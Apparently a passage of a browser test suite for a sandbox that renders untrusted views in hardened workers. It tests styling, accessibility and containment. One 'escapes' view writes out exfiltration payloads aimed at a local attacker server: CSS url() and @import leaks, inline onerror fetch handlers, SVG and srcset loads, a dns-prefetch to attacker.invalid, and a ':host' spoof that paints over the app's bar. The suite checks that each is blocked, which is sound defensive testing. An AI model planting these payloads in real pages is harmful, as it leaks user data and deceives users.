/**
 * A WORKER VIEW ON THE OPEN KIT, IN A REAL BROWSER (FR-90): the open
 * transport of `scripts/guest-sandbox.mjs`.
 *
 * Three views run in hardened classic workers and draw into shadow roots
 * on one page:
 *
 *   showcase  a styled card grid, an SVG bar chart and a CSS-animated
 *             progress ring, drawn from the app's theme tokens, checked in
 *             light and again after the app's toggle to dark, from two
 *             stylesheets, a shared one and its own;
 *   escapes   every way out a view might try — a url() in every property
 *             that takes one, @import, @font-face, an escaped url, SVG
 *             <image href> and <use> of another document, <a href="https:">,
 *             srcset, an <img> with an address, a <link rel=preconnect>
 *             built in code, inline handlers, a fixed overlay — each to its
 *             own path on an attacker's server;
 *   prober    what the view's own worker can still reach after hardening;
 *   spoofer   a stylesheet that spells `:host` past a CDC or CDO, to lift
 *             the region's containment and paint over the app's own bar;
 *   speaker   landmarks and notices by element, by role and by a named
 *             section, read back from each engine's accessibility tree;
 *   controls  a view's own accessible controls — a span with
 *             role="checkbox" and aria-checked, ticked by a press, a
 *             switch, tabs, a radio group, a slider — read back from the
 *             accessibility tree, and the same view run headless, drawn
 *             attribute for attribute as the page drew it.
 *
 * The page is served with NO content security policy (`--policy=page`), so
 * nothing but the open kit stands between a view and the network: every
 * request the browser makes is recorded, every connection the attacker's
 * server takes is counted, and the claim is that there are none but the
 * page itself. `--policy=claude` runs the same inside Claude's widget frame.
 */
import { createServer } from "node:http";
import { resolve } from "node:path";
import { localize, POLICIES, proxyPage } from "./widget-policies.mjs";

/** Every CSS property that takes a url() somewhere, each tried on its own element and its own path. */
export const URL_PROPERTIES = [
  "background", "background-image", "border-image", "border-image-source", "list-style", "list-style-image", "cursor", "content", "mask", "mask-image",
  "-webkit-mask-image", "filter", "clip-path", "shape-outside", "offset-path", "fill", "stroke", "marker", "--custom",
];

/** A view as the open kit runs one: its runtime first, then its own code, one strict classic script. */
export function viewScriptOf(repoRoot, build) {
  const viewRuntime = resolve(repoRoot, "packages/guest/dist/worker/view.js");
  return async (code) =>
    (
      await build({
        stdin: { contents: `import ${JSON.stringify(viewRuntime)};\n${code}`, resolveDir: repoRoot, loader: "js" },
        bundle: true,
        format: "iife",
        banner: { js: '"use strict";' },
        write: false,
        platform: "browser",
        target: "es2022",
        logLevel: "silent",
      })
    ).outputFiles[0].text;
}

const TOKENS = (scheme) => {
  const { DARK, LIGHT, TYPOGRAPHY } = scheme;
  const block = (tokens) =>
    `--graview-ground:${tokens.ground};--graview-panel:${tokens.panel};--graview-ink:${tokens.ink};--graview-ink-muted:${tokens.inkMuted};--graview-edge:${tokens.edge};--graview-accent:${tokens.accent};--graview-font-body:${TYPOGRAPHY.body};--graview-font-mono:${TYPOGRAPHY.mono};`;
  return `[data-graview-scheme="light"]{${block(LIGHT)}color-scheme:light}[data-graview-scheme="dark"]{${block(DARK)}color-scheme:dark}`;
};

export async function openSuite({ repoRoot, build, browser, claim, report, POLICY, ENGINE, HOST, GUEST, HOST_PORT, GUEST_PORT, ATTACKER_PORT, SHOWROOM }) {
  const ATTACKER = `http://127.0.0.1:${ATTACKER_PORT}`;
  const core = await import(resolve(repoRoot, "packages/core/dist/index.js"));
  const viewScript = viewScriptOf(repoRoot, build);

  const showcaseJs = await viewScript(`
graview.style(\`
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; padding: 12px; }
.card { background: var(--graview-panel); color: var(--graview-ink); border: 1px solid var(--graview-edge); border-radius: 12px; padding: 12px; }
.card h3 { margin: 0 0 4px; font: 600 15px/1.3 var(--graview-font-body); }
.muted { color: var(--graview-ink-muted); margin: 0; }
.card h3 { letter-spacing: 1px; }
\`);
/* The view's own sheet, after the shared one: both are drawn, this one second (Threat Watch, 2026-10-21). */
graview.style(\`
.card h3 { letter-spacing: 2px; }
.chart stop { stop-color: var(--graview-accent); }
.chart .bar { fill: url(#barFill); }
.chart text { fill: var(--graview-ink); font: 10px var(--graview-font-body); }
.ring { width: 64px; height: 64px; animation: spin 1.2s linear infinite; transform-origin: 50% 50%; }
.ring .track { stroke: var(--graview-edge); }
.ring .value { stroke: var(--graview-accent); transition: stroke-dashoffset 300ms ease-out; }
@keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
@media (max-width: 300px) { .grid { grid-template-columns: 1fr; } }
\`);
const values = [12, 30, 22, 45];
graview.onProps((props) => {
  const nodes = props.nodes || [];
  graview.render(graview.html\`
    <section class="grid">\${nodes.map((node) => graview.html\`<article class="card" data-key="\${node.id}"><h3>\${node.label}</h3><p class="muted">\${node.kind}</p></article>\`)}</section>
    <svg class="chart" viewBox="0 0 120 60" width="240" height="120" role="img" aria-label="Bars">
      <defs><linearGradient id="barFill" x1="0" y1="0" x2="0" y2="1"><stop offset="0"/><stop offset="1" stop-opacity="0.6"/></linearGradient></defs>
      \${values.map((value, index) => graview.html\`<rect class="bar" x="\${10 + index * 25}" y="\${55 - value}" width="18" height="\${value}"/>\`)}
      <text x="60" y="9" text-anchor="middle">Bars</text>
    </svg>
    <svg class="ring" viewBox="0 0 36 36" role="img" aria-label="Two thirds done"><circle class="track" cx="18" cy="18" r="15" fill="none" stroke-width="4"/><circle class="value" cx="18" cy="18" r="15" fill="none" stroke-width="4" stroke-dasharray="94.2" stroke-dashoffset="31"/></svg>\`);
});
`);

  const urlRules = URL_PROPERTIES.map((property) =>
    property === "--custom" ? `.u--custom { --leak: url(${ATTACKER}/css/custom); background-image: var(--leak); }` : `.u-${property.replace(/^-/, "_")} { ${property}: url(${ATTACKER}/css/${property}); }`,
  ).join("\n");
  const escapesJs = await viewScript(`
const A = ${JSON.stringify(ATTACKER)};
graview.style(\`
${urlRules}
@import url(\${A}/import/url);
@import "\${A}/import/string";
@font-face { font-family: leak; src: url(\${A}/font/face) format("woff2"); }
.font { font-family: leak, sans-serif; }
.escaped { background: u\\\\72l(\${A}/css/escaped); }
.image-set { background-image: image-set("\${A}/css/image-set.png" 1x); }
.fixed-sheet { position: fixed; inset: 0; z-index: 2147483647; background: rgba(255, 0, 0, 0.5); }
.cell { display: list-item; min-height: 12px; }
\`);
const preconnect = document.createElement("link");
preconnect.setAttribute("rel", "preconnect");
preconnect.setAttribute("href", A + "/preconnect");
const prefetch = document.createElement("link");
prefetch.setAttribute("rel", "dns-prefetch");
prefetch.setAttribute("href", "//attacker.invalid");
const cells = ${JSON.stringify(URL_PROPERTIES.map((property) => (property === "--custom" ? "u--custom" : `u-${property.replace(/^-/, "_")}`)))};
graview.onProps(() => {
  graview.render([graview.html\`
    <div id="cells">\${cells.map((name) => graview.html\`<div class="cell \${name}">\${name}</div>\`)}</div>
    <p class="font">a font</p><p class="escaped">escaped</p><p class="image-set">image-set</p>
    <svg id="svg" viewBox="0 0 20 20" width="20" height="20"><image href="\${A}/svg/image" width="10" height="10"/><image xlink:href="\${A}/svg/xlink" width="10" height="10"/><use href="\${A}/svg/use.svg#a"/><feImage href="\${A}/svg/feimage"/></svg>
    <a id="link" href="\${A}/link">a link out</a>
    <img id="srcset" alt="srcset" srcset="\${A}/img/srcset 1x">
    <img id="addressed" alt="addressed" src="\${A}/img/src">
    <img id="handled" alt="handled" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=" onerror="fetch('\${A}/handler/onerror')" onload="fetch('\${A}/handler/onload')">
    <div id="clicked" onclick="fetch('\${A}/handler/onclick')">click me</div>
    <iframe src="\${A}/frame"></iframe><object data="\${A}/object"></object><embed src="\${A}/embed">
    <div id="overlay" style="position: fixed; inset: 0; z-index: 2147483647; background: rgba(0, 0, 255, 0.5)">a fixed overlay</div>
    <div id="overlay-sheet" class="fixed-sheet">another</div>
    <form action="\${A}/form"><button formaction="\${A}/formaction">send</button></form>
  \`, preconnect, prefetch]);
});
`);

  /* A view that reaches its own region's host by a marker the sanitizer drops (`:-->host`), lifts the region's containment and paints over the app's bar. */
  const spooferJs = await viewScript(`
graview.style(\`
:-->host { contain: none !important; overflow: visible !important; position: static !important; isolation: auto !important; }
:<!--host { min-width: 0 !important; }
.cover { position: absolute; top: 0; left: 0; width: 100vw; height: 48px; z-index: 2147483647; background: rgb(200, 0, 0); }
\`);
graview.onProps(() => graview.render(graview.html\`<div class="cover" id="cover">The app's own bar, drawn by a view</div>\`));
`);

  /* A view that tries to speak with the app's landmarks and notices: by element, by role, and by naming a section. */
  const speakerJs = await viewScript(`
graview.style(".said header { color: rgb(1, 2, 3); }");
graview.onProps(() => graview.render(graview.html\`
  <div class="said"><nav id="said-nav">Main menu</nav><header>The app</header></div><footer>Footer</footer><aside>Aside</aside><search>Search</search>
  <section aria-label="Notices">Named by aria-label</section><section title="Updates">Named by title</section><output>Saved</output>
  <div role="complementary">c</div><div role="search">s</div><div role="form" aria-label="Sign in">f</div><div role="region" aria-label="Region">r</div>
  <div role="status">st</div><div role="log">lg</div><nav role="none" tabindex="0" aria-label="Back door">Presentational, but focusable and named</nav>
  <p id="said-done">said</p>\`));
`);

  const proberJs = await viewScript(`
const out = {};
out.absent = Object.fromEntries(["fetch", "XMLHttpRequest", "WebSocket", "EventSource", "importScripts", "indexedDB", "caches", "BroadcastChannel", "Worker", "SharedWorker", "Blob", "URL", "eval"].map((name) => [name, !(name in self)]));
out.graviewFrozen = Object.isFrozen(graview);
out.graviewKept = typeof graview.render === "function";
out.replace = (() => { try { self.graview = 1; return typeof graview; } catch (error) { return error.name; } })();
out.functionMakesNothing = (() => { try { Function("return 1")(); return "made"; } catch (error) { return error.name; } })();
out.stuck = graview.hardening.stuck;
graview.onProps(() => graview.render(graview.html\`<pre id="probed">\${JSON.stringify(out)}</pre>\`));
`);


  /*
   * A view's own accessible controls (Threat Watch, 2026-10-21): the checkbox Graview Cloud filed — a span with role="checkbox"
   * and aria-checked, ticked by a press — a switch, a pressed toggle, a disclosure that says what it controls, tabs and their
   * panel, a radio group and a slider, each read back from the engine's accessibility tree, and the same view run headless.
   */
  const controlsSource = `
var DONE = { "step:1": true };
graview.style(".box { display: inline-block; width: 20px; height: 20px; border: 2px solid #94a3b8; } .box[aria-checked=true] { background: rgb(5, 122, 85); }");
function draw() {
  graview.render(graview.html\`<div class="gx" role="group" aria-label="Steps">
    \${["step:1", "step:2"].map(function (id) { return graview.html\`<div class="it" data-key="\${id}"><span class="box" role="checkbox" aria-checked="\${DONE[id] ? "true" : "false"}" aria-label="\${"Tick " + id}" tabindex="0" data-ck="\${id}"></span></div>\`; })}
    <span class="sw" role="switch" aria-checked="true" tabindex="0" aria-label="Only live threats"></span>
    <span role="button" aria-pressed="true" tabindex="0">Bold</span>
    <span role="button" aria-expanded="false" aria-controls="more-steps" tabindex="0">Show all</span><div id="more-steps" hidden>More</div>
    <div role="tablist" aria-label="Audience"><span role="tab" id="tab-dev" aria-selected="true" aria-controls="panel-dev" tabindex="0">Developers</span><span role="tab" id="tab-ops" aria-selected="false" tabindex="-1">IT and ops</span></div>
    <div role="tabpanel" id="panel-dev" aria-labelledby="tab-dev">The developers' steps</div>
    <div role="radiogroup" aria-label="Urgency"><span role="radio" aria-checked="true" tabindex="0">Now</span><span role="radio" aria-checked="false" tabindex="-1">Today</span></div>
    <span role="slider" aria-valuenow="40" aria-valuemin="0" aria-valuemax="100" aria-valuetext="40 percent" aria-label="Done" tabindex="0"></span>
    <p id="controls-done">drawn</p></div>\`);
}
graview.onProps(draw);
graview.on("click", "[data-ck]", function (event) { var id = event.element.getAttribute("data-ck"); DONE[id] = !DONE[id]; draw(); });
`;
  const controlsJs = await viewScript(controlsSource);

  /*
   * A view's links out (Threat Watch, 2026-10-21): to the car's own page and its dealer's address, which the view was handed, and
   * two it made — the car's page with what it read added, and a javascript: one — which are refused.
   */
  const linkerSource = `
graview.onProps(function (props) {
  var car = (props.nodes || []).find(function (node) { return node.kind === "car"; }) || {};
  graview.render(graview.html\`<p><a id="out-site" href="\${car.site}">The Golf's page</a> · <a id="out-mail" href="\${car.dealer}">Write to the dealer</a>
    · <a id="out-leak" href="\${car.site + "?read=" + car.label}">Leaked</a> · <a id="out-js" href="javascript:alert(1)">Script</a></p><p id="linker-done">drawn</p>\`);
});
`;
  const linkerJs = await viewScript(linkerSource);

  const widgetJs = (
    await build({
      stdin: {
        contents: `
import { mountWorkerView } from "./packages/guest/dist/host/worker.js";
${SHOWROOM}
const failures = [];
const views = {};
for (const [name, script] of [["showcase", SHOWCASE], ["escapes", ESCAPES], ["prober", PROBER], ["spoofer", SPOOFER], ["speaker", SPEAKER], ["controls", CONTROLS], ["linker", LINKER]]) {
  views[name] = mountWorkerView(document.getElementById(name), { manifest: { name, attach: "car", cardinality: "many", reads: { kinds: ["shopper"] } }, worker: { script }, store, principal: bethan, onFailure: (reason, detail) => failures.push([name, reason, detail]) });
}
window.__host = {
  ...host,
  failures,
  refused: () => Object.fromEntries(Object.entries(views).map(([name, view]) => [name, view.refused])),
  scheme: (scheme) => document.body.setAttribute("data-graview-scheme", scheme),
};
`,
        resolveDir: repoRoot,
        loader: "js",
      },
      bundle: true,
      format: "iife",
      write: false,
      platform: "browser",
      target: "es2022",
      logLevel: "silent",
      define: { "process.env.NODE_ENV": '"production"' },
    })
  ).outputFiles[0].text;
  const inline = `const SHOWCASE = ${JSON.stringify(showcaseJs)}; const ESCAPES = ${JSON.stringify(escapesJs)}; const PROBER = ${JSON.stringify(proberJs)}; const SPOOFER = ${JSON.stringify(spooferJs)}; const SPEAKER = ${JSON.stringify(speakerJs)}; const CONTROLS = ${JSON.stringify(controlsJs)}; const LINKER = ${JSON.stringify(linkerJs)};\n${widgetJs}`.replace(/<\/script/gi, "<\\/script");
  const widgetHtml = `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>The app</title><style>${TOKENS(core)}
body { margin: 0; background: var(--graview-ground); color: var(--graview-ink); font-family: var(--graview-font-body); }
#bar { height: 48px; display: flex; align-items: center; padding: 0 12px; border-bottom: 1px solid var(--graview-edge); }
main { display: grid; gap: 16px; padding: 16px; }
#showcase, #escapes, #prober { border: 1px dashed var(--graview-edge); }
.probe-panel { background-color: var(--graview-panel); border-top: 1px solid var(--graview-edge); color: var(--graview-accent); }
</style></head><body data-graview-scheme="light"><header id="bar">The app's own bar</header><main><div id="showcase"></div><div id="escapes"></div><div id="prober"></div><div id="spoofer"></div><div id="speaker"></div><div id="controls"></div><div id="linker"></div></main><footer id="foot" class="probe-panel">The app's own footer</footer><script>${inline}</script></body></html>`;

  const attacker = { requests: [], connections: 0 };
  const servers = [
    createServer((req, res) => {
      attacker.requests.push(req.url);
      res.writeHead(200, { "content-type": "text/plain", "access-control-allow-origin": "*" });
      res.end("leaked");
    }).on("connection", () => (attacker.connections += 1)),
  ];
  servers[0].listen(ATTACKER_PORT, "127.0.0.1");
  const proxied = POLICY !== "page";
  const policy = proxied ? POLICIES[POLICY] : undefined;
  const hostHtml = proxied ? `<!doctype html><html><head><meta charset="utf-8"><title>Chat</title></head><body><iframe id="proxy" title="Widget" style="width:900px;height:1400px;border:0" src="${GUEST}/proxy/${POLICY}.html"></iframe></body></html>` : widgetHtml;
  servers.push(
    createServer((req, res) => {
      if (req.url === "/") {
        res.writeHead(200, { "content-type": "text/html", "cache-control": "no-store" });
        return res.end(hostHtml);
      }
      res.writeHead(404);
      res.end();
    }).listen(HOST_PORT, "127.0.0.1"),
    createServer((req, res) => {
      if (proxied && req.url === `/proxy/${POLICY}.html`) {
        res.writeHead(200, { "content-type": "text/html", "cache-control": "no-store", "content-security-policy": localize(policy.proxyCsp, HOST) });
        return res.end(proxyPage(policy, widgetHtml, HOST));
      }
      res.writeHead(404);
      res.end();
    }).listen(GUEST_PORT, "localhost"),
  );

  try {
    const context = await browser.newContext({ viewport: { width: 1000, height: 1500 } });
    const requests = [];
    context.on("request", (request) => requests.push(request.url()));
    const tab = await context.newPage();
    tab.on("pageerror", (error) => report.pageErrors.push(String(error).slice(0, 200)));
    await tab.goto(`${HOST}/`, { waitUntil: "load" });
    let app;
    for (let i = 0; i < 100 && !app; i += 1) {
      for (const frame of tab.frames()) if (await frame.evaluate(() => typeof window.__host === "object").catch(() => false)) app = frame;
      if (!app) await tab.waitForTimeout(100);
    }
    if (!app) throw new Error("the page never mounted its views");
    const inShadow = (name, selector) => app.evaluate(([at, query]) => document.getElementById(at)?.querySelector("[data-worker-view]")?.shadowRoot?.querySelector(query) ?? null, [name, selector]);
    const waitFor = async (name, selector, what) => {
      for (let i = 0; i < 100; i += 1) {
        if (await app.evaluate(([at, query]) => Boolean(document.getElementById(at)?.querySelector("[data-worker-view]")?.shadowRoot?.querySelector(query)), [name, selector])) return;
        await tab.waitForTimeout(100);
      }
      throw new Error(`${what} never drawn: ${JSON.stringify(await app.evaluate(() => window.__host.failures))}`);
    };
    void inShadow;
    await waitFor("showcase", ".ring", "the showcase");
    await waitFor("escapes", "#overlay-sheet", "the escapes");
    await waitFor("prober", "#probed", "the prober");
    await waitFor("spoofer", "#cover", "the spoofer");
    await waitFor("speaker", "#said-done", "the speaker");
    await waitFor("controls", "#controls-done", "the controls");
    await waitFor("linker", "#linker-done", "the linker");
    /* Long enough for anything kept to have been fetched: images, fonts, a preconnect. */
    await tab.waitForTimeout(1_500);

    // ── the showcase, in light and in dark ──
    const look = () =>
      app.evaluate(() => {
        const root = document.querySelector("#showcase [data-worker-view]").shadowRoot;
        const probe = getComputedStyle(document.getElementById("foot"));
        const card = root.querySelector(".card");
        const ring = root.querySelector(".ring");
        const value = root.querySelector(".ring .value");
        const stop = root.querySelector(".chart stop");
        const bar = root.querySelector(".chart .bar");
        const grid = root.querySelector(".grid");
        return {
          cards: root.querySelectorAll(".card").length,
          bars: root.querySelectorAll(".chart .bar").length,
          grid: getComputedStyle(grid).display,
          columns: getComputedStyle(grid).gridTemplateColumns.split(" ").length,
          cardBackground: getComputedStyle(card).backgroundColor,
          cardBorder: getComputedStyle(card).borderTopColor,
          panel: probe.backgroundColor,
          edge: probe.borderTopColor,
          accent: probe.color,
          ring: getComputedStyle(value).stroke,
          stop: getComputedStyle(stop).stopColor,
          barFill: getComputedStyle(bar).fill,
          animation: getComputedStyle(ring).animationName,
          svgNamespace: root.querySelector(".chart").namespaceURI,
          sheets: root.querySelectorAll("style[data-graview-view-style]").length,
          spacing: getComputedStyle(root.querySelector(".card h3")).letterSpacing,
        };
      });
    const turned = () => app.evaluate(() => getComputedStyle(document.querySelector("#showcase [data-worker-view]").shadowRoot.querySelector(".ring")).transform);
    const light = await look();
    const before = await turned();
    await tab.waitForTimeout(250);
    const after = await turned();
    claim("a worker view draws a styled card grid, an SVG bar chart and a CSS-animated progress ring", light.cards === 2 && light.bars === 4 && light.grid === "grid" && light.svgNamespace === "http://www.w3.org/2000/svg" && light.animation === "spin", light);
    claim("in light, the cards take the app's panel and edge, and the ring and the bars the app's accent", light.cardBackground === light.panel && light.cardBorder === light.edge && light.ring === light.accent && light.stop === light.accent && /url\(/.test(light.barFill), light);
    claim("a view that calls graview.style twice draws both sheets, the second after the first: the cards from the shared one, the ring from its own, and its own rule winning where both say one", light.sheets === 1 && light.cardBackground === light.panel && light.animation === "spin" && light.spacing === "2px", light);
    claim("the progress ring turns: its keyframes are drawn and running", before !== after && before !== "none", { before, after });
    await app.evaluate(() => window.__host.scheme("dark"));
    await tab.waitForTimeout(200);
    const dark = await look();
    claim("after the app's toggle to dark, the same view takes the dark panel, edge and accent", dark.panel !== light.panel && dark.cardBackground === dark.panel && dark.cardBorder === dark.edge && dark.ring === dark.accent && dark.stop === dark.accent, { light, dark });

    // ── the escapes ──
    const escapes = await app.evaluate(() => {
      const region = document.querySelector("#escapes [data-worker-view]");
      const root = region.shadowRoot;
      const html = root.innerHTML;
      const sheet = root.querySelector("style[data-graview-view-style]").textContent;
      /* What is on top of the app's own bar and footer, each scrolled into view to be asked. */
      const onTop = (id) => {
        const element = document.getElementById(id);
        element.scrollIntoView({ block: "center" });
        const box = element.getBoundingClientRect();
        return document.elementFromPoint(box.left + 5, box.top + box.height / 2);
      };
      const atBar = onTop("bar");
      const atFoot = onTop("foot");
      region.scrollIntoView({ block: "start" });
      const box = region.getBoundingClientRect();
      const overlay = root.querySelector("#overlay");
      const sheetOverlay = root.querySelector("#overlay-sheet");
      return {
        html,
        sheet,
        tags: [...root.querySelectorAll("*")].map((one) => one.localName),
        attributes: [...root.querySelectorAll("*")].flatMap((one) => [...one.attributes].map((attribute) => `${one.localName} ${attribute.name}=${attribute.value.slice(0, 80)}`)),
        link: root.querySelector("#link") && { href: root.querySelector("#link").getAttribute("href"), text: root.querySelector("#link").textContent },
        overlay: overlay && { position: getComputedStyle(overlay).position, rect: overlay.getBoundingClientRect().toJSON() },
        sheetOverlay: sheetOverlay && { position: getComputedStyle(sheetOverlay).position },
        region: box.toJSON(),
        atBar: atBar?.id ?? atBar?.localName,
        atFoot: atFoot?.id ?? atFoot?.localName,
      };
    });
    await app.evaluate(() => {
      const root = document.querySelector("#escapes [data-worker-view]").shadowRoot;
      root.querySelector("#link")?.click();
      root.querySelector("#clicked")?.click();
      root.querySelector("form button, button")?.click();
    });
    await tab.waitForTimeout(800);
    const hit = (path) => attacker.requests.filter((url) => url.startsWith(path));
    const kept = (word) => escapes.sheet.includes(word) || escapes.html.includes(word);
    for (const property of URL_PROPERTIES) {
      const path = property === "--custom" ? "/css/custom" : `/css/${property}`;
      claim(`CSS url() in ${property} is removed, and nothing was asked for it`, !kept(`${ATTACKER}${path}`) && hit(path).length === 0, { hits: hit(path) });
    }
    claim("@import is refused, by url() and by string", !/@import/i.test(escapes.sheet) && hit("/import").length === 0, { hits: hit("/import") });
    claim("@font-face is refused, and the font it named is asked for nowhere", !/@font-face/i.test(escapes.sheet) && hit("/font").length === 0, { hits: hit("/font") });
    claim("an escaped url, u\\72l(…), is refused", !kept("/css/escaped") && hit("/css/escaped").length === 0, { hits: hit("/css/escaped") });
    claim("image-set() is refused", !kept("/css/image-set") && hit("/css/image-set").length === 0, { hits: hit("/css/image-set") });
    claim("SVG <image href> and <image xlink:href> are not drawn, nor <feImage>", !escapes.tags.includes("image") && !escapes.tags.includes("feImage") && hit("/svg/image").length + hit("/svg/xlink").length + hit("/svg/feimage").length === 0, escapes.tags);
    claim("SVG <use> of another document is drawn with no reference", !kept("/svg/use") && hit("/svg/use").length === 0, { hits: hit("/svg/use") });
    claim('<a href="https:…"> to an address the view made is drawn as text, with no href, and pressing it goes nowhere', escapes.link && escapes.link.href === null && escapes.link.text === "a link out" && hit("/link").length === 0 && tab.url() === `${HOST}/`, { link: escapes.link, url: tab.url() });
    claim("srcset is not drawn", !escapes.attributes.some((one) => / (srcset|sizes)=/.test(one)) && hit("/img/srcset").length === 0, { hits: hit("/img/srcset") });
    claim("an <img> with an address is drawn with none", !kept("/img/src") && hit("/img/src").length === 0, { hits: hit("/img/src") });
    claim("a <link rel=preconnect> built in code is not drawn, and nothing connected to its host", !escapes.tags.includes("link") && hit("/preconnect").length === 0, { tags: escapes.tags });
    claim("inline handlers are not drawn, and the image, the click and the button set none off", !escapes.attributes.some((one) => / on[a-z]+=/.test(one)) && hit("/handler").length === 0, { hits: hit("/handler") });
    claim("<iframe>, <object>, <embed> and <form> are not drawn, and a press on what was drawn submits nothing", !["iframe", "object", "embed", "form"].some((tag) => escapes.tags.includes(tag)) && hit("/frame").length + hit("/object").length + hit("/embed").length + hit("/form").length === 0, escapes.tags);
    claim(
      "a fixed overlay stays in the view's region: drawn in place, and the app's bar and footer are still on top where they are",
      escapes.overlay?.position !== "fixed" && escapes.sheetOverlay?.position !== "fixed" && escapes.atBar === "bar" && escapes.atFoot === "foot" && escapes.overlay.rect.top >= escapes.region.top - 1,
      { overlay: escapes.overlay, sheetOverlay: escapes.sheetOverlay, region: escapes.region, atBar: escapes.atBar, atFoot: escapes.atFoot },
    );
    const spoofed = await app.evaluate(() => {
      const region = document.querySelector("#spoofer [data-worker-view]");
      const bar = document.getElementById("bar");
      bar.scrollIntoView({ block: "center" });
      const box = bar.getBoundingClientRect();
      const at = document.elementFromPoint(box.left + 5, box.top + box.height / 2);
      return { cover: region.shadowRoot.querySelector("#cover").getBoundingClientRect().toJSON(), sheet: region.shadowRoot.querySelector("style[data-graview-view-style]").textContent, at: at?.id || at?.localName, contain: getComputedStyle(region).contain, overflow: getComputedStyle(region).overflow };
    });
    claim(
      "a view's stylesheet never reaches its region's :host, however the selector is spelled (:-->host, :<!--host), and the app's bar stays on top",
      !/:\s*host/i.test(spoofed.sheet) && spoofed.at === "bar" && /paint|content|strict/.test(spoofed.contain) && spoofed.overflow === "clip",
      spoofed,
    );
    /*
     * What each engine's accessibility tree says of what the view drew: its own region is a region, and nothing under it a landmark or a notice.
     * Read on the app's own page: inside a chat's cross-origin frame (`--policy=claude`) Playwright's snapshot does not reach the out-of-process
     * frame, and what the view's elements are drawn as does not depend on the frame they are in.
     */
    const region = await app.evaluateHandle(() => document.querySelector("#speaker [data-worker-view]"));
    const tree = proxied ? undefined : await tab.accessibility.snapshot({ root: region, interestingOnly: false });
    const roles = [];
    const walk = (node) => {
      for (const child of node?.children ?? []) {
        roles.push(child.role);
        walk(child);
      }
    };
    walk(tree);
    const SPEAKING = ["navigation", "banner", "contentinfo", "complementary", "search", "region", "form", "main", "landmark", "status", "alert", "alertdialog", "dialog", "log", "marquee", "timer", "application"];
    const spoken = roles.filter((role) => SPEAKING.includes(String(role).toLowerCase()));
    const said = await app.evaluate(() => document.querySelector("#speaker [data-worker-view]").shadowRoot.querySelector("[data-graview-view-root]").textContent);
    const styled = await app.evaluate(() => {
      const header = document.querySelector("#speaker [data-worker-view]").shadowRoot.querySelector('[data-graview-as="header"]');
      return header && { tag: header.localName, color: getComputedStyle(header).color };
    });
    claim("a view's own rule for header still styles what it drew, drawn as a div", styled?.tag === "div" && styled.color === "rgb(1, 2, 3)", styled);
    if (!proxied) claim(
      "nothing a view draws speaks with a landmark or a notice's role in the accessibility tree (nav, header, footer, aside, search, a named section, output, or role=…), and its words are still drawn",
      tree?.role !== undefined && spoken.length === 0 && ["Main menu", "The app", "Footer", "Aside", "Search", "Named by title", "Saved", "Presentational"].every((words) => said.includes(words)),
      { root: tree?.role, spoken, roles: [...new Set(roles)] },
    );
    // ── a view's own accessible controls ──
    const controlsRegion = await app.evaluateHandle(() => document.querySelector("#controls [data-worker-view]"));
    const controlsTree = proxied ? undefined : await tab.accessibility.snapshot({ root: controlsRegion, interestingOnly: false });
    const spokenControls = [];
    const walkControls = (node) => {
      for (const child of node?.children ?? []) {
        spokenControls.push({ role: String(child.role).toLowerCase(), name: child.name, checked: child.checked, pressed: child.pressed, expanded: child.expanded, selected: child.selected, valuetext: child.valuetext });
        walkControls(child);
      }
    };
    walkControls(controlsTree);
    const one = (role, name) => spokenControls.find((node) => node.role === role && (name === undefined || node.name === name));
    const drawnControls = () =>
      app.evaluate(() => {
        const region = document.querySelector("#controls [data-worker-view]");
        const root = region.shadowRoot.querySelector("[data-graview-view-root]");
        return {
          failed: region.getAttribute("data-worker-view-failed"),
          fallback: Boolean(region.shadowRoot.querySelector("[data-graview-fallback]")),
          ticked: [...root.querySelectorAll("[data-ck]")].map((box) => box.getAttribute("aria-checked")),
          background: getComputedStyle(root.querySelector('[data-ck="step:1"]')).backgroundColor,
          /* What the view drew: the host's own marks of a link or a press it made (0.1.47 marks a control the view hears itself) are the page's, not the view's. */
          attributes: [...root.querySelectorAll("*")].map((element) => [element.localName, [...element.attributes].filter((one) => one.name !== "autocomplete" && one.name !== "data-graview-press" && one.name !== "data-graview-link").map((one) => [one.name, one.value]).sort(([a], [b]) => (a < b ? -1 : 1))]),
        };
      });
    const controlsBefore = await drawnControls();
    claim(
      'a view\'s <span role="checkbox" aria-checked> is drawn as the view drew it, not stopped and not replaced, with its state styled by its own [aria-checked] rule',
      controlsBefore.failed === null && !controlsBefore.fallback && controlsBefore.ticked.join(",") === "true,false" && controlsBefore.background === "rgb(5, 122, 85)",
      controlsBefore,
    );
    if (!proxied) claim(
      "the engine's accessibility tree says each of the view's own controls with its state: a checked checkbox and an unchecked one, a switch on, a pressed button (a button, where WebKit's tree says no state of one), a collapsed disclosure, the selected tab, the checked radio and the slider's value",
      one("checkbox", "Tick step:1")?.checked === true && one("checkbox", "Tick step:2") !== undefined && one("checkbox", "Tick step:2").checked !== true && one("switch")?.checked === true && spokenControls.some((node) => node.name === "Bold" && (node.pressed === true || /toggle/.test(node.role) || (ENGINE === "webkit" && node.role === "button"))) &&
        one("button", "Show all") !== undefined && one("button", "Show all").expanded !== true && one("tab", "Developers")?.selected === true && one("radio", "Now")?.checked === true && (one("slider")?.valuetext === "40 percent" || one("slider") !== undefined),
      { controls: spokenControls.filter((node) => node.name) },
    );
    await app.evaluate(() => document.querySelector("#controls [data-worker-view]").shadowRoot.querySelector('[data-ck="step:2"]').click());
    let controlsAfter = await drawnControls();
    for (let i = 0; i < 20 && controlsAfter.ticked.join(",") !== "true,true"; i += 1) {
      await tab.waitForTimeout(50);
      controlsAfter = await drawnControls();
    }
    claim("a press on the view's checkbox ticks it: the view draws aria-checked again and the page keeps it", controlsAfter.ticked.join(",") === "true,true" && controlsAfter.failed === null, controlsAfter.ticked);
    /* The same view, run headless in this process as Graview Cloud's propose_view runs it, drawn into the run's tree and set beside the page's. */
    const guestHeadless = await import(resolve(repoRoot, "packages/guest/dist/headless/index.js"));
    const guestNode = await import(resolve(repoRoot, "packages/guest/dist/headless/node.js"));
    const runStore = new core.Store({ schema: core.createSchema([core.defineNode("car", { fields: core.z.object({ label: core.z.string() }), plural: "Cars" })]), mutations: [], policy: { grants: [] }, snapshot: { nodes: [{ id: "car:golf", kind: "car", label: "Golf" }], edges: [] } });
